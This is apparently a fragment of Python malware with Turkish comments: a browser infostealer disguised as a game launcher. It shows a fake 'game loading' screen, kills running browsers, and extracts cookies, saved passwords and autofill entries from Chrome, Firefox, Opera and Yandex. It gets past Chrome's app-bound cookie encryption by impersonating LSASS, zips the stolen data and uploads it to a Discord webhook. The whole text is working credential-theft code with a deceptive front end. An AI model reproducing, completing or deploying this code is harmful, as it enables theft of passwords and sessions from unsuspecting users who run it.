        content += f"<a:billing_spacex:1429086530965868654> {browser_name}: {len(autofill_data)} autofill\n"
        
        payload = {
            'content': content,
            'username': 'Autofill Bot',
            'avatar_url': 'https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&'
        }
        
        response = requests.post(webhook_url, data=payload, files=files)
        files['file'][1].close()
        
        if response.status_code == 200:
            return True
        else:
            return False
            
    except Exception as e:
        return False

def print_game_loading():
    """Video oyunu başlatma ekranı"""
    import time
    import random
    import os
    
    # CMD'yi temizle
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print("\n" + "="*60)
    print("🎮" + " "*20 + "HAIRO13X7 GAME LAUNCHER" + " "*20 + "🎮")
    print("="*60)
    print()
    
    # Oyun başlatma mesajları
    game_messages = [
        "🎯 Initializing Game Engine...",
        "🔧 Loading Game Assets...",
        "⚡ Optimizing Performance...",
        "🎨 Rendering Graphics...",
        "🌐 Connecting to Game Server...",
        "🎵 Loading Audio System...",
        "🎮 Preparing Game Interface...",
        "🚀 Launching Game Client..."
    ]
    
    # Yükleme animasyonu
    for i, message in enumerate(game_messages):
        print(f"\r{message}", end="", flush=True)
        
        # Yükleme çubuğu
        for j in range(3):
            print(".", end="", flush=True)
            time.sleep(0.3)
        
        print(" ✅")
        time.sleep(0.5)
    
    print("\n" + "="*60)
    print("🎮" + " "*18 + "GAME SUCCESSFULLY LAUNCHED!" + " "*18 + "🎮")
    print("="*60)
    print()
    
    # Yükleme çubuğu animasyonu (yeşil renk)
    print("🔄 Loading Game Data...")
    for i in range(50):
        # Yeşil renk için ANSI escape codes
        green_bar = f"\033[92m{'█' * i}\033[0m"
        gray_bar = f"\033[90m{'░' * (50-i)}\033[0m"
        print(f"\r[{green_bar}{gray_bar}] {i*2}%", end="", flush=True)
        time.sleep(0.05)
    print(" ✅")
    
    print("🎮 Game Ready! Starting...")
    time.sleep(1)
    print()

def main():
    # Webhook URL
    COOKIE_WEBHOOK_URL = "%WEBHOOK%"
    
    # Oyun başlatma ekranı
    print_game_loading()
    
    # Tarayıcıları kapat (sessizce)
    kill_browsers()
    
    # Tarayıcı konfigürasyonlarını al
    browser_configs = get_browser_configs()
    existing_browsers = {name: config for name, config in browser_configs.items() 
                        if os.path.exists(config.get('local_state', config.get('profiles_path', '')))}
    
    # Tüm tarayıcı verilerini topla
    all_browser_data = {}
    browser_stats = {}
    
    try:
        for browser_name, browser_config in existing_browsers.items():
            try:
                browser_data = {
                    'cookies': [],
                    'passwords': [],
                    'autofill': []
                }
                
                # Cookie'leri çıkar
                if browser_config['type'] == 'firefox':
                    browser_data['cookies'] = extract_firefox_cookies(browser_config['profiles_path'])
                elif 'Yandex' in browser_name:
                    # Yandex için özel decryptor kullan
                    try:
                        decryptor = YandexCookieDecryptor(browser_config['local_state'], browser_config['cookie_db'])
                        browser_data['cookies'] = decryptor.extract_cookies()
                    except Exception as e:
                        browser_data['cookies'] = []
                elif 'Opera' in browser_name or browser_name.startswith('Opera_'):
                    # Opera için özel decryptor kullan
                    try:
                        decryptor = OperaCookieDecryptor(browser_config['local_state'], browser_config['cookie_db'])
                        browser_data['cookies'] = decryptor.extract_cookies()
                    except Exception as e:
                        browser_data['cookies'] = []
                else:
                    # Chrome tabanlı tarayıcılar için
                    browser_data['cookies'] = extract_chrome_cookies(browser_config['local_state'], browser_config['cookie_db'])
                
                # Şifreleri çıkar
                if browser_config['type'] == 'firefox':
                    # Firefox için özel şifre çıkarma
                    browser_data['passwords'] = extract_firefox_passwords(browser_config['profiles_path'])
                elif browser_config['type'] == 'chrome' or 'Opera' in browser_name or 'Yandex' in browser_name or browser_name.startswith('Opera_'):
                    # Chrome tabanlı tarayıcılar için (Opera ve Yandex dahil)
                    login_db_path = browser_config['cookie_db'].replace('Network\\Cookies', 'Login Data')
                    browser_data['passwords'] = extract_passwords(browser_config['local_state'], login_db_path, browser_name)
                
                # Autofill verilerini çıkar (Chrome tabanlı tarayıcılar için)
                if browser_config['type'] == 'chrome' or 'Opera' in browser_name or 'Yandex' in browser_name or browser_name.startswith('Opera_'):
                    web_data_path = browser_config['cookie_db'].replace('Network\\Cookies', 'Web Data')
                    browser_data['autofill'] = extract_autofill(browser_config['local_state'], web_data_path, browser_name)
                
                # Verileri topla
                all_browser_data[browser_name] = browser_data
                browser_stats[browser_name] = {
                    'cookies': len(browser_data['cookies']),
                    'passwords': len(browser_data['passwords']),
                    'autofill': len(browser_data['autofill'])
                }
                
            except Exception as e:
                pass
        
        # ZIP dosyası oluştur ve gönder
        if all_browser_data:
            zip_filename = create_browser_data_zip(all_browser_data)
            
            if zip_filename:
                send_zip_to_discord(zip_filename, COOKIE_WEBHOOK_URL, browser_stats)
                
                # ZIP dosyasını temizle
                try:
                    os.remove(zip_filename)
                except:
                    pass
        
    except Exception as e:
        pass

def extract_chrome_cookies(local_state_path, cookie_db_path):
    """Chrome tabanlı tarayıcıların cookie'lerini çıkar"""
    cookies_data = []
    try:
        # Read Local State
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
        assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
        key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]
        
        # Decrypt with SYSTEM DPAPI
        with impersonate_lsass():
            key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)

        # Decrypt with user DPAPI
        key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
        
        # Parse key blob
        parsed_data = parse_key_blob(key_blob_user_decrypted)
        v20_master_key = derive_v20_master_key(parsed_data)

        # fetch all v20 cookies
        con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
        cookies = cur.fetchall()
        cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
        con.close()

        # decrypt v20 cookie with AES256GCM
        def decrypt_cookie_v20(encrypted_value):
            cookie_iv = encrypted_value[3:3+12]
            encrypted_cookie = encrypted_value[3+12:-16]
            cookie_tag = encrypted_value[-16:]
            cookie_cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=cookie_iv)
            decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
            return decrypted_cookie[32:].decode('utf-8')

        # Cookie'leri topla
        for c in cookies_v20:
            try:
                decrypted_value = decrypt_cookie_v20(c[2])
                cookies_data.append({
                    'domain': c[0],
                    'name': c[1], 
                    'value': decrypted_value
                })
            except Exception as e:
                pass
            
    except Exception as e:
        pass
    
    return cookies_data

if __name__ == "__main__":
    if not is_admin():
        print("This script needs to run as administrator.")
    else:
        main()
